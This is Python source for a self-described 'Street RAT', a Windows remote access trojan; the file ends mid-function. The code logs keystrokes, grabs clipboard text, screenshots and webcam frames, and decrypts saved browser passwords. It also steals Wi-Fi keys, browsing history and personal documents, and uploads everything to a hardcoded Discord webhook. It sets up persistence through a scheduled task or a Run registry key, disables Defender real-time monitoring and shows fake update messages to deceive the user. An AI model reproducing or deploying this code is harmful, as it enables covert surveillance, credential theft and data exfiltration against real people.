import os
import sys
import time
import subprocess
import socket
import platform
import getpass
import shutil
import sqlite3
import json
import requests
import threading
import random
import string
import glob
import psutil
import atexit
import traceback
import base64
import argparse
import cv2
import numpy as np
import mss
import pyperclip
from datetime import datetime, timedelta
from enum import Enum
from PIL import Image
from pynput.keyboard import Listener, Key
from pynput.mouse import Listener as MouseListener, Button
os.environ["OPENCV_LOG_LEVEL"] = "ERROR"

# Constants
VERSION = "2.4.59"
LOOT_LOG = os.path.join(os.getenv("TEMP", "/tmp"), "syshealthmonitor.log")
OS_TYPE = Enum('OS_TYPE', ['WINDOWS', 'LINUX', 'MACOS'])
CURRENT_OS = OS_TYPE.WINDOWS if sys.platform.startswith("win") else OS_TYPE.LINUX if sys.platform.startswith("linux") else OS_TYPE.MACOS
HUSTLA_NAME = getpass.getuser()
SNATCHED_LOOT = {}
keylog_stash = []
hustle_queue = []
offline_stash = []
keylog_drop = os.path.join(os.getenv("TEMP", "/tmp"), "keylog_stash.txt")
last_window = ""
stash_lock = threading.Lock()
drop_lock = threading.Lock()
hustle_lock = threading.Lock()
stop_da_ops = threading.Event()
cam_condition = threading.Condition()
cam_in_play = False
session = requests.Session()
session.mount("https://", requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=10))
GRAB_SELFIE_FIRST = True
last_hustle_confirmed = 0
CAMERA = None
SELFIE_IN_PROGRESS = False
INSTALLED_GEAR = []
NET_CREW = {}
BROWSER_MOVES = {}
HUSTLA_DIRS = ""
TIMESTAMPS = {
    "last_screenshot": 0,
    "last_selfie": 0,
    "last_cmd_grab": 0,
    "last_loot_run": 0,
    "last_keylog_drop": 0,
    "last_clip_check": 0,
    "last_window_peep": 0
}
FEATURE_FLAGS = {
    "snatch_creds": False,
    "cam_watch": False
}
DROP_SPOT = "https://discord.com/api/webhooks/1349542358416359606/ptw4v8lViDmzEfxyoWu-Dmk2qSXvDksE27mNMHbJdp8oI_tUV_buY3baKVLUkY0I6JJo"
HIDE_OUT = os.path.join(os.getenv("APPDATA", os.path.expanduser("~")), "sysutils")
HIDE_DROP = os.path.join(os.getenv("APPDATA", os.path.expanduser("~")), "sysutils", "syshealthmonitor.py")
PID_DROP = os.path.join(os.getenv("APPDATA", os.path.expanduser("~")), "sysutils", ".sysjug.pid")
OFFLINE_DROP = os.path.join(os.getenv("APPDATA", os.path.expanduser("~")), "sysutils", "offline_stash")
CHUNK_CASH = 5.5 * 1024 * 1024

# Args
parser = argparse.ArgumentParser(description="Street RAT")
parser.add_argument("-t", "--test", action="store_true", help="Run in test mode with logs")
args = parser.parse_args()
TEST_MODE = args.test
DEBUG = TEST_MODE

# Utils
def log_shit(msg, *args, exc_info=None):
    msg = msg % args if args else msg
    stacktrace = " - stack: " + "".join(traceback.format_exception(*exc_info)) if exc_info else ""
    try:
        with open(LOOT_LOG, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} - debug - {msg}{stacktrace}\n")
    except Exception:
        pass
    if TEST_MODE:
        sys.stderr.write(f"debug: {msg}{stacktrace}\n")

def rand_code(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def got_net():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=2)
        return True
    except Exception:
        return False

def exec_with_timeout(cmd, shell=False, timeout=5):
    try:
        result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=timeout)
        return result.stdout.splitlines()
    except Exception:
        return []

# Setup
log_shit("hustle kicked off - v%s", VERSION)
def finesse_deps():
    log_shit("checkin' the stash")
    deps = [
        ("requests", "requests>=2.28.1"),
        ("psutil", "psutil>=5.9.0"),
        ("pynput", "pynput>=1.7.6"),
        ("pyperclip", "pyperclip>=1.8.2"),
        ("opencv-python", "opencv-python>=4.11.0"),
        ("mss", "mss>=9.0.1"),
        ("Pillow", "Pillow>=9.0.0")
    ]
    os_extras = {
        OS_TYPE.WINDOWS: [
            ("wmi", "wmi>=1.5.1", "cam_watch"),
            ("pywin32", "pywin32>=306", "snatch_creds"),
            ("pycryptodome", "pycryptodome>=3.15.0", "snatch_creds")
        ]
    }
    for dep, pkg, *feature in deps + os_extras.get(CURRENT_OS, []):
        try:
            __import__(dep)
            log_shit("%s in the bag", dep)
            if feature:
                FEATURE_FLAGS[feature[0]] = True
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pkg, "-q"])
                log_shit("snagged %s off the block", pkg)
                if feature:
                    FEATURE_FLAGS[feature[0]] = True
            except Exception as e:
                log_shit("pip fucked up for %s: %s", pkg, e)
                if not feature:
                    sys.exit(f"must-have {pkg} went bust")

finesse_deps()
if CURRENT_OS == OS_TYPE.WINDOWS:
    import win32gui
    import win32crypt
    import winreg
    import win32api
    import win32con
    import win32process
    import wmi
    import ctypes
    import pythoncom
    IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0
    WMI_AVAILABLE = FEATURE_FLAGS["cam_watch"]

# Cam
def prep_cam():
    global CAMERA
    if CAMERA is None or not CAMERA.isOpened():
        CAMERA = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not CAMERA.isOpened():
            log_shit("prep_cam: cam 0 ain't live with CAP_DSHOW, tryin' CAP_MSMF")
            CAMERA.release()
            CAMERA = cv2.VideoCapture(0, cv2.CAP_MSMF)
            if not CAMERA.isOpened():
                log_shit("prep_cam: cam 0 dead on CAP_MSMF too")
                CAMERA.release()
                CAMERA = None
                return
        props = [
            (cv2.CAP_PROP_FPS, 60),
            (cv2.CAP_PROP_BUFFERSIZE, 1),
            (cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG')),
            (cv2.CAP_PROP_FRAME_WIDTH, 640),
            (cv2.CAP_PROP_FRAME_HEIGHT, 480),
            (cv2.CAP_PROP_CONVERT_RGB, 0)
        ]
        for prop, val in props:
            CAMERA.set(prop, val)
        log_shit("prep_cam: cam locked in with %s", CAMERA.getBackendName())

def warm_cam():
    global CAMERA
    while not stop_da_ops.is_set():
        with cam_condition:
            if CAMERA is None or not CAMERA.isOpened():
                prep_cam()
                if CAMERA is None:
                    time.sleep(5)
                    continue
            ret, _ = CAMERA.read()
            if not ret:
                log_shit("warm_cam: cam dropped, rebootin'")
                CAMERA.release()
                CAMERA = None
        time.sleep(1)

# Queue
def juggthiscracka(data=None, file_path=None):
    with hustle_lock:
        connected = got_net()
        queue = hustle_queue if connected else offline_stash
        if data:
            data = f"Target: {HUSTLA_NAME}\n{data}"
            size = len(data)
            if size > CHUNK_CASH:
                chunks = [data[i:i+CHUNK_CASH] for i in range(0, size, CHUNK_CASH)]
                for i, chunk in enumerate(chunks):
                    queue.append((chunk, None))
                    log_shit("jugged %s - type=text, chunk=%d, size=%d", "live" if connected else "offline", i+1, len(chunk))
                return
        elif file_path and os.path.exists(file_path):
            size = os.path.getsize(file_path)
            if file_path.endswith((".txt", ".log")):
                with open(file_path, "r+", encoding="utf-8") as f:
                    content = f.read()
                    f.seek(0)
                    f.write(f"Target: {HUSTLA_NAME}\n{content}")
            if size > CHUNK_CASH:
                with open(file_path, "rb") as f:
                    content = f.read()
                chunks = [content[i:i+CHUNK_CASH] for i in range(0, len(content), CHUNK_CASH)]
                for i, chunk in enumerate(chunks):
                    chunk_file = f"{file_path}.part{i+1}"
                    with open(chunk_file, "wb") as cf:
                        cf.write(chunk)
                    queue.append((None, chunk_file))
                    log_shit("jugged %s - type=file, chunk=%d, file=%s, size=%d", "live" if connected else "offline", i+1, chunk_file, os.path.getsize(chunk_file))
                os.remove(file_path)
                return
        else:
            log_shit("juggthiscracka: skipped dry loot - file=%s", file_path)
            return
        size = len(data) if data else os.path.getsize(file_path)
        queue.append((data, file_path))
        log_shit("jugged %s - type=%s, file=%s, size=%d", "live" if connected else "offline", "text" if data else "file", file_path, size)
        if not connected:
            stash_offline(data, file_path)

def stash_offline(data, file_path):
    os.makedirs(OFFLINE_DROP, exist_ok=True)
    dest = os.path.join(OFFLINE_DROP, os.path.basename(file_path) if file_path else f"loot_{rand_code()}.txt")
    if file_path:
        shutil.copy(file_path, dest)
    elif data:
        with open(dest, "w", encoding="utf-8") as f:
            f.write(str(data))

def handle_offline_stash():
    while not stop_da_ops.is_set():
        if got_net() and offline_stash:
            with hustle_lock:
                hustle_queue.extend(offline_stash)
                offline_stash.clear()
                shutil.rmtree(OFFLINE_DROP, ignore_errors=True)
        time.sleep(random.uniform(3, 7))

def snatchdatloot():
    global last_hustle_confirmed
    while not stop_da_ops.is_set():
        if not hustle_queue:
            log_shit("snatchdatloot: queue dry, chillin'")
            time.sleep(random.uniform(1, 3))
            continue
        with hustle_lock:
            data, file_path = hustle_queue[0]
        size = os.path.getsize(file_path) if file_path else len(data) if data else 0
        if size > 7 * 1024 * 1024:
            with hustle_lock:
                hustle_queue.pop(0)
            if file_path and os.path.exists(file_path):
                os.remove(file_path)
            log_shit("snatchdatloot: skipped - too fat: %d bytes", size)
            continue
        delay = random.uniform(1, 3)
        if time.time() - last_hustle_confirmed < delay:
            time.sleep(delay - (time.time() - last_hustle_confirmed))
        log_shit("snatchdatloot: hittin' the drop, size=%d", size)
        for attempt in range(3):
            try:
                resp = drop_da_loot(data, file_path)
                log_shit("snatchdatloot: attempt %d, status=%d", attempt + 1, resp.status_code)
                if resp.status_code in (200, 204):
                    with hustle_lock:
                        hustle_queue.pop(0)
                    if file_path and os.path.exists(file_path):
                        os.remove(file_path)
                    last_hustle_confirmed = time.time()
                    log_shit("snatchdatloot: loot dropped, confirmed at %f", last_hustle_confirmed)
                    time.sleep(max(int(resp.headers.get("X-Rate-Limit-Reset-After", 5)), random.uniform(5, 10)))
                    break
                elif resp.status_code == 429:
                    retry_after = int(resp.headers.get("Retry-After", 60))
                    log_shit("snatchdatloot: rate capped, holdin' %ds", retry_after)
                    time.sleep(retry_after)
                else:
                    log_shit("snatchdatloot: drop failed, status %d, retryin'", resp.status_code)
                    time.sleep(2 ** attempt)
            except Exception as e:
                log_shit("snatchdatloot: drop fucked on attempt %d - %s", attempt + 1, e, exc_info=sys.exc_info())
                if attempt == 2:
                    with hustle_lock:
                        hustle_queue.append(hustle_queue.pop(0))
                    log_shit("snatchdatloot: max retries, requeued")
                time.sleep(2 ** attempt)

def drop_da_loot(data, file_path):
    if file_path:
        with open(file_path, "rb") as f:
            return session.post(DROP_SPOT, files={"file": (os.path.basename(file_path), f)}, timeout=10)
    temp_drop = os.path.join(os.getenv("TEMP", "/tmp"), f"stash_{rand_code()}.txt")
    with open(temp_drop, "w", encoding="utf-8") as f:
        f.write(str(data))
    with open(temp_drop, "rb") as f:
        resp = session.post(DROP_SPOT, files={"file": (os.path.basename(temp_drop), f)}, timeout=10)
    os.remove(temp_drop)
    return resp

# Crew
def wipe_old_ops():
    log_shit("cleanin' old plays")
    if os.path.exists(PID_DROP):
        with open(PID_DROP, "r") as f:
            pid = int(f.read().strip())
        if pid != os.getpid() and psutil.pid_exists(pid):
            psutil.Process(pid).terminate()
            time.sleep(1)
            if psutil.pid_exists(pid):
                psutil.Process(pid).kill()
        os.remove(PID_DROP)
    if CURRENT_OS == OS_TYPE.WINDOWS and IS_ADMIN:
        subprocess.run("schtasks /delete /tn syshealthmonitor /f", shell=True, check=False)

def run_da_crew():
    wipe_old_ops()
    os.makedirs(HIDE_OUT, exist_ok=True)
    with open(PID_DROP, "w") as f:
        f.write(str(os.getpid()))
    atexit.register(lambda: os.remove(PID_DROP) if os.path.exists(PID_DROP) else None)

def stay_low():
    log_shit("settin' up the hideout")
    if random.choice([0, 1]) == 0:
        cmd = f'schtasks /create /tn syshealthmonitor /tr "\"{sys.executable}\" \"{HIDE_DROP}\" -t\" /sc ONSTART /ru SYSTEM /f'
        try:
            subprocess.run(cmd, shell=True, check=True)
            log_shit("schtasks persistence locked in")
        except Exception:
            pass
    else:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "perfboost", 0, winreg.REG_SZ, f'"{sys.executable}" "{HIDE_DROP}" -t')
            log_shit("registry persistence locked in")
        except Exception:
            pass
    subprocess.run("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"", shell=True, check=False)
    log_shit("finessed Defender real-time off")

def fake_da_ops():
    if not TEST_MODE:
        moves = ["Scannin' system...", "Pullin' updates...", "Puttin' in patches...", "Boostin' shit...", "Finalizin' play...", "All good, fam!"]
        for move in moves:
            sys.stdout.write(f"[{datetime.now()}] v{VERSION} - {move}\n")
            time.sleep(random.uniform(0.2, 0.7))
    else:
        sys.stdout.write(f"[{datetime.now()}] v{VERSION} - runnin' the play...\n")
        time.sleep(0.5)
        sys.stdout.write("play done!\n")

# Keylogger
def watch_da_keys():
    log_shit("key watch on")
    line_buffer = []
    modifiers = {'ctrl': False, 'alt': False, 'shift': False}
    last_enter_time = 0

    def drop_keylog():
        while not stop_da_ops.is_set():
            if time.time() - TIMESTAMPS["last_keylog_drop"] >= random.uniform(10, 20) and keylog_stash:
                with stash_lock:
                    with open(keylog_drop, "a", encoding="utf-8") as f:
                        f.write("```\n" + "\n".join(keylog_stash) + "\n```\n")
                    if os.path.getsize(keylog_drop) >= 3 * 1024 * 1024:
                        juggthiscracka(file_path=keylog_drop)
                        keylog_stash.clear()
                        open(keylog_drop, "w").close()
                    TIMESTAMPS["last_keylog_drop"] = time.time()
            time.sleep(0.5)

    threading.Thread(target=drop_keylog, daemon=True).start()

    def on_press(key):
        nonlocal last_enter_time
        if stop_da_ops.is_set():
            return False
        window = peep_window()
        if key in (Key.ctrl_l, Key.ctrl_r):
            modifiers['ctrl'] = True
            return
        if key in (Key.alt_l, Key.alt_r):
            modifiers['alt'] = True
            return
        if key in (Key.shift, Key.shift_r):
            modifiers['shift'] = True
            return
        shortcut = catch_shortcut(key, modifiers)
        if shortcut:
            with stash_lock:
                keylog_stash.append(f"[{datetime.now().strftime('%H:%M:%d/%m/%Y')}] {window} Hit: {shortcut}")
            modifiers.update({'ctrl': False, 'alt': False, 'shift': False})
            line_buffer.clear()
            return
        key_char = key.char if hasattr(key, 'char') and key.char else str(key)
        if key_char == "Key.enter" and line_buffer and time.time() - last_enter_time >= 5:
            with stash_lock:
                keylog_stash.append(f"[{datetime.now().strftime('%H:%M:%d/%m/%Y')}] {window} Hit: {''.join(line_buffer).strip()}")
            snap_screen("Enter key smashed")
            last_enter_time = time.time()
            line_buffer.clear()
        elif key_char not in ("Key.ctrl_l", "Key.alt_l", "Key.shift", "Key.enter"):
            line_buffer.append(key_char)
        modifiers.update({
            'ctrl': key in (Key.ctrl_l, Key.ctrl_r) and modifiers['ctrl'],
            'alt': key in (Key.alt_l, Key.alt_r) and modifiers['alt'],
            'shift': key in (Key.shift, Key.shift_r) and modifiers['shift']
        })

    with Listener(on_press=on_press) as listener:
        listener.join()

def catch_shortcut(key, mods):
    if hasattr(key, 'char') and mods['ctrl'] and key.char == 'c':
        return "[ctrl-c]"
    if hasattr(key, 'char') and mods['ctrl'] and key.char == 'v':
        return "[ctrl-v]"
    if hasattr(key, 'char') and mods['ctrl'] and key.char == 'x':
        return "[ctrl-x]"
    if mods['alt'] and key == Key.tab:
        return "[alt-tab]"
    return None

def peep_window():
    if CURRENT_OS == OS_TYPE.WINDOWS:
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if "Explorer" in window:
            parts = window.split(' - ')
            return f"[Checkin' file: {os.path.basename(parts[0] if parts else window)}]"
        return window or "unknown"
    return "unknown"

# Mouse
def watch_da_mouse():
    log_shit("mouse watch on")
    def on_click(x, y, button, pressed):
        if button == Button.right and pressed and time.time() - TIMESTAMPS["last_screenshot"] >= 5:
            snap_screen("Right click popped")
    with MouseListener(on_click=on_click) as listener:
        listener.join()

# Clip
def snatch_clip():
    log_shit("clip snatch on")
    last_clip = ""
    while not stop_da_ops.is_set():
        if time.time() - TIMESTAMPS["last_clip_check"] >= random.uniform(8, 12):
            clip_data = pyperclip.paste()
            if clip_data != last_clip and clip_data:
                content = f"Clip snatched at {datetime.now().strftime('%H:%M:%d/%m/%Y')}:\n{clip_data}"
                if len(content.encode('utf-8')) <= 2 * 1024 * 1024:
                    temp_drop = os.path.join(os.getenv("TEMP", "/tmp"), f"clip_{rand_code()}.txt")
                    with open(temp_drop, "w", encoding="utf-8") as f:
                        f.write(content)
                    juggthiscracka(file_path=temp_drop)
                    last_clip = clip_data
                    TIMESTAMPS["last_clip_check"] = time.time()
        time.sleep(0.5)

# Loot
def update_crew_info():
    global INSTALLED_GEAR, NET_CREW, HUSTLA_DIRS
    INSTALLED_GEAR = get_installed_gear()
    NET_CREW = get_net_crew()
    HUSTLA_DIRS = get_hustla_dirs()

def get_installed_gear():
    if CURRENT_OS != OS_TYPE.WINDOWS:
        return []
    gear = []
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall")
        for i in range(winreg.QueryInfoKey(key)[0]):
            subkey_name = winreg.EnumKey(key, i)
            subkey = winreg.OpenKey(key, subkey_name)
            name, _ = winreg.QueryValueEx(subkey, "DisplayName")
            gear.append(name)
    except Exception:
        pass
    return gear

def get_net_crew():
    if CURRENT_OS != OS_TYPE.WINDOWS:
        return {}
    output = exec_with_timeout("ipconfig")
    crew = {}
    for line in output:
        if "IPv4 Address" in line:
            crew["ip"] = line.split(":")[1].strip()
        elif "Subnet Mask" in line:
            crew["subnet"] = line.split(":")[1].strip()
        elif "Default Gateway" in line:
            crew["gateway"] = line.split(":")[1].strip()
    return crew

def update_browser_moves():
    global BROWSER_MOVES
    paths = {
        "chrome": os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "History"),
        "edge": os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "History"),
        "firefox": os.path.join(os.getenv("APPDATA", ""), "Mozilla", "Firefox", "Profiles", "*.default-release", "places.sqlite"),
        "opera": os.path.join(os.getenv("LOCALAPPDATA", ""), "Opera Software", "Opera Stable", "History"),
        "operagx": os.path.join(os.getenv("LOCALAPPDATA", ""), "Opera Software", "Opera GX Stable", "History"),
        "brave": os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
    }
    BROWSER_MOVES = snatch_browser_moves(paths)

def snatch_browser_moves(paths):
    moves = {}
    cutoff = (datetime.now() - timedelta(days=7)).timestamp()
    for browser, path in paths.items():
        if not os.path.exists(path) and not glob.glob(path):
            continue
        real_path = path if os.path.exists(path) else glob.glob(path)[0]
        temp_path = os.path.join(os.getenv("TEMP", "/tmp"), f"moves_{rand_code()}")
        shutil.copy(real_path, temp_path)
        with sqlite3.connect(temp_path) as conn:
            query = f"SELECT url, {'last_visit_time' if browser != 'firefox' else 'lastVisitDate/1000'} FROM {'urls' if browser != 'firefox' else 'moz_places'} WHERE {'last_visit_time' if browser != 'firefox' else 'lastVisitDate'} >= ?"
            timestamp = cutoff * (1000000 if browser != "firefox" else 1000) + (11644473600 if browser != "firefox" else 0)
            rows = conn.execute(query, (timestamp,)).fetchall()
            moves[browser] = [
                {
                    "url": row[0],
                    "time": datetime.fromtimestamp(row[1]/1000000 - (11644473600 if browser != "firefox" else 0) if browser != "firefox" else row[1]).strftime('%Y-%m-%d %H:%M')
                }
                for row in rows
            ]
        os.remove(temp_path)
    return moves

def drop_browser_moves():
    new_count = sum(len(BROWSER_MOVES.get(b, [])) - len(SNATCHED_LOOT.get("browser_moves", {}).get(b, [])) for b in BROWSER_MOVES)
    if new_count >= 10:
        content = "```\nMoves (Last 7 Days):\n"
        for browser, entries in BROWSER_MOVES.items():
            if entries:
                content += f"\n{browser.capitalize()}:\n"
                content += "\n".join(f"{e['time']} - {e['url']}" for e in entries) + "\n"
        content += "```"
        juggthiscracka(content)
        SNATCHED_LOOT["browser_moves"] = BROWSER_MOVES.copy()

def snatch_creds():
    if not FEATURE_FLAGS["snatch_creds"]:
        log_shit("snatch_creds: off - no gear")
        return {}
    spots = {
        "chrome": [os.path.join(p, "Google", "Chrome", "User Data") for p in [os.getenv("LOCALAPPDATA", ""), os.getenv("PROGRAMFILES", ""), os.getenv("PROGRAMFILES(X86)", ""), os.getenv("APPDATA", "")]],
        "edge": [os.path.join(p, "Microsoft", "Edge", "User Data") for p in [os.getenv("LOCALAPPDATA", ""), os.getenv("PROGRAMFILES", ""), os.getenv("PROGRAMFILES(X86)", "")]],
        "firefox": [os.path.join(p, "Mozilla", "Firefox", "Profiles") for p in [os.getenv("APPDATA", ""), os.getenv("PROGRAMFILES", ""), os.getenv("PROGRAMFILES(X86)", "")]],
        "opera": [os.path.join(p, "Opera Software", "Opera Stable") for p in [os.getenv("LOCALAPPDATA", ""), os.getenv("APPDATA", ""), os.getenv("PROGRAMFILES", ""), os.getenv("PROGRAMFILES(X86)", "")]],
        "operagx": [os.path.join(p, "Opera Software", "Opera GX Stable") for p in [os.getenv("LOCALAPPDATA", ""), os.getenv("APPDATA", ""), os.getenv("PROGRAMFILES", ""), os.getenv("PROGRAMFILES(X86)", "")]],
        "brave": [os.path.join(p, "BraveSoftware", "Brave-Browser", "User Data") for p in [os.getenv("LOCALAPPDATA", ""), os.getenv("PROGRAMFILES", ""), os.getenv("PROGRAMFILES(X86)", "")]]
    }
    creds = {}
    for browser, bases in spots.items():
        for base in [os.path.expanduser(b) for b in bases]:
            if not os.path.exists(base):
                log_shit("snatch_creds: %s spot empty - %s", browser, base)
                continue
            if browser in ("chrome", "edge", "opera", "operagx", "brave"):
                state_path = os.path.join(base, "Local State")
                profiles = [os.path.join(base, "Default", "Login Data")] + glob.glob(os.path.join(base, "**", "Login Data"), recursive=True)
                for p in profiles:
                    profile_name = os.path.basename(os.path.dirname(p)) if "Profile" in p else "Default"
                    creds[f"{browser}_{profile_name}"] = finesse_browser_creds(p, state_path)
            elif browser == "firefox":
                profiles = glob.glob(os.path.join(base, "*.default*")) + glob.glob(os.path.join(base, "*.release"))
                for p in profiles:
                    creds[f"firefox_{os.path.basename(p)}"] = finesse_firefox_creds(os.path.join(p, "logins.json"))
    return creds

def finesse_browser_creds(login_data_path, state_path):
    if not os.path.exists(login_data_path) or not os.path.exists(state_path):
        log_shit("finesse_browser_creds: files missin' - login_data=%s, state=%s", login_data_path, state_path)
        return {}
    results = {}
    with open(state_path, "r", encoding="utf-8") as f:
        state = json.load(f)
    key = win32crypt.CryptUnprotectData(base64.b64decode(state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    temp_path = os.path.join(os.getenv("TEMP", "/tmp"), f"creds_{rand_code()}")
    shutil.copy(login_data_path, temp_path)
    with sqlite3.connect(temp_path) as conn:
        for url, user, enc_pass in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
            if not enc_pass or not user:
                continue
            if enc_pass.startswith(b"v10"):
                from Crypto.Cipher import AES
                cipher = AES.new(key, AES.MODE_GCM, nonce=enc_pass[3:15])
                decrypted = cipher.decrypt(enc_pass[15:-16]).decode("utf-8")
                cipher.verify(enc_pass[-16:])
                results[url] = {"username": user, "password": decrypted}
            else:
                decrypted = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode("utf-8")
                results[url] = {"username": user, "password": decrypted}
    os.remove(temp_path)
    return results

def finesse_firefox_creds(path):
    log_shit("firefox creds off - NSS ain't here")
    return {}

def get_hustla_dirs():
    hustla_base = os.path.expanduser("~")
    tree = f"Crew\n|_{os.path.basename(hustla_base)}\n"
    for root, _, _ in os.walk(hustla_base):
        if os.path.relpath(root, hustla_base) != ".":
            depth = os.path.relpath(root, hustla_base).count(os.sep) + 1
            tree += "   " * depth + "|_" + os.path.basename(root) + "\n"
    return tree

def drop_hot_files(files):
    if not files:
        return
    import zipfile
    zip_drop = os.path.join(os.getenv("TEMP", "/tmp"), f"hot_{rand_code()}.zip")
    with zipfile.ZipFile(zip_drop, "w", zipfile.ZIP_DEFLATED) as zf:
        for i, f in enumerate(files[:50]):
            zf.write(f, f"drop_{i}{os.path.splitext(f)[1]}")
    if os.path.getsize(zip_drop) <= int(7 * 1024 * 1024):
        juggthiscracka(file_path=zip_drop)
    else:
        os.remove(zip_drop)

def get_hot_files():
    dirs = [os.path.expanduser(d) for d in ("~/Desktop", "~/Documents", "~/Downloads")]
    exts = (".docx", ".pdf", ".xls", ".xlsx", ".txt")
    files = []
    for d in dirs:
        for root, _, fs in os.walk(d):
            for f in fs:
                if f.endswith(exts):
                    files.append(os.path.join(root, f))
    return files

def run_loot(is_first_hit):
    if not is_first_hit and time.time() - TIMESTAMPS["last_loot_run"] < random.uniform(25, 35):
        return
    connected = got_net()
    update_crew_info()
    current_loot = {
        "crew": {
            "hostname": socket.gethostname(),
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "hustla": HUSTLA_NAME
        },
        "wifi": get_wifi_spots(),
        "creds": snatch_creds(),
        "gear": INSTALLED_GEAR,
        "net": NET_CREW,
        "dirs": HUSTLA_DIRS
    }
    formatted_loot = "```\n" + "\n".join(f"{k}: {json.dumps(v, indent=2) if isinstance(v, dict) else v}" for k, v in current_loot.items()) + "\n```"
    if is_first_hit:
        SNATCHED_LOOT.update(current_loot)
        if connected:
            juggthiscracka(formatted_loot)
            drop_hot_files(get_hot_files())
    elif connected:
        changes = {k: current_loot[k] for k in current_loot if k not in SNATCHED_LOOT or current_loot[k] != SNATCHED_LOOT[k]}
        if changes:
            juggthiscracka("new loot:\n```\n" + "\n".join(f"{k}: {json.dumps(v, indent=2) if isinstance(v, dict) else v}" for k, v in changes.items()) + "\n```")
            drop_hot_files(get_hot_files())
            SNATCHED_LOOT.update(changes)
    TIMESTAMPS["last_loot_run"] = time.time()

def get_wifi_spots():
    if CURRENT_OS != OS_TYPE.WINDOWS:
        return {}
    wifi_spots = {}
    profiles = exec_with_timeout("netsh wlan show profiles", shell=True)
    for line in profiles:
        if "All User Profile" in line:
            spot = line.split(":")[1].strip()
            key_output = exec_with_timeout(f'netsh wlan show profile name="{spot}" key=clear', shell=True)
            for key_line in key_output:
                if "Key Content" in key_line:
                    wifi_spots[spot] = key_line.split(":")[1].strip()
    return wifi_spots

def periodic_loot():
    while not stop_da_ops.is_set():
        time.sleep(random.uniform(1, 3))
        run_loot(False)
        drop_browser_moves()

# Cam Watch
def check_cam_play():
    if not FEATURE_FLAGS["cam_watch"]:
        log_shit("cam watch off - no gear")
        return
    if CURRENT_OS == OS_TYPE.WINDOWS and IS_ADMIN and WMI_AVAILABLE:
        def wmi_cam_watch():
            pythoncom.CoInitialize()
            watcher = wmi.WMI().Win32_DeviceChangeEvent.watch_for("creation")
            while not stop_da_ops.is_set():
                event = watcher(timeout_ms=500)
                if event and "Video" in event.TargetInstance.Name:
                    global cam_in_play
                    cam_in_play = True
                    log_shit("cam play caught via WMI")
        threading.Thread(target=wmi_cam_watch, daemon=True, name="wmi_cam_watch").start()
    else:
        def fallback_cam_check():
            while not stop_da_ops.is_set():
                time.sleep(2)
                for proc in psutil.process_iter(['pid', 'name']):
                    if proc.pid != os.getpid() and os.path.basename(sys.argv[0]).lower() not in proc.info['name'].lower():
                        if check_proc_cam(proc):
                            global cam_in_play
                            cam_in_play = True
                            break
                log_shit("cam check (fallback): in_play=%s", cam_in_play)
        threading.Thread(target=fallback_cam_check, daemon=True, name="fallback_cam_check").start()

def check_proc_cam(proc):
    if CURRENT_OS != OS_TYPE.WINDOWS or 'win32process' not in sys.modules:
        return False
    try:
        for handle in win32process.EnumProcessModules(proc.pid):
            if "\\Device\\Video" in win32api.GetModuleFileNameEx(proc.pid, handle):
                return True
    except Exception:
        return False
    return False

# Snaps
def resize_snap(file_path, max_size_kb=512):
    if not os.path.exists(file_path):
        return
    img = Image.open(file_path)
    quality = 85
    while os.path.getsize(file_path) > max_size_kb * 1024:
        img = img.resize((int(img.size[0] * 0.9), int(img.size[1] * 0.9)), Image.Resampling.LANCZOS)
        img.save(file_path, format=img.format, quality=quality)
        quality = max(10, quality - 10)
    log_shit("snap resized: %s, new size=%d bytes", file_path, os.path.getsize(file_path))

def grab_snap(capture_func, prefix):
    temp_drop = os.path.join(os.getenv("TEMP", "/tmp"), f"{prefix}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    start_time = time.time()
    capture_func(temp_drop)
    if not os.path.exists(temp_drop):
        return None
    size = os.path.getsize(temp_drop)
    if size > 7 * 1024 * 1024:
        resize_snap(temp_drop)
        size = os.path.getsize(temp_drop)
    if size <= 7 * 1024 * 1024:
        with hustle_lock:
            TIMESTAMPS[f"last_{prefix}"] = time.time()
        log_shit(f"{prefix}: snatched, file=%s, size=%d, time=%fms", temp_drop, size, (time.time() - start_time) * 1000)
        return temp_drop
    os.remove(temp_drop)
    return None

def snatch_selfie_file(temp_drop):
    global CAMERA
    if CAMERA and CAMERA.isOpened():
        ret, frame = CAMERA.read()
        if ret:
            cv2.imencode('.png', frame, [cv2.IMWRITE_PNG_COMPRESSION, 9])[1].tofile(temp_drop)
            log_shit("selfie: snatched with cam 0, %s", CAMERA.getBackendName())
        else:
            log_shit("selfie: no frame from cam 0")

def snatch_screen_file(temp_drop):
    mss.mss().shot(output=temp_drop)

def finesse_selfie():
    global SELFIE_IN_PROGRESS
    with hustle_lock:
        if time.time() - TIMESTAMPS["last_selfie"] < 5:
            log_shit("selfie: hold up - cooldown")
            return
        if SELFIE_IN_PROGRESS:
            log_shit("selfie: already snappin', chill")
            return
        SELFIE_IN_PROGRESS = True
    try:
        if cam_in_play or GRAB_SELFIE_FIRST:
            file_path = grab_snap(snatch_selfie_file, "selfie")
            if file_path:
                juggthiscracka(file_path=file_path)
        else:
            log_shit("selfie: no cam play detected")
    finally:
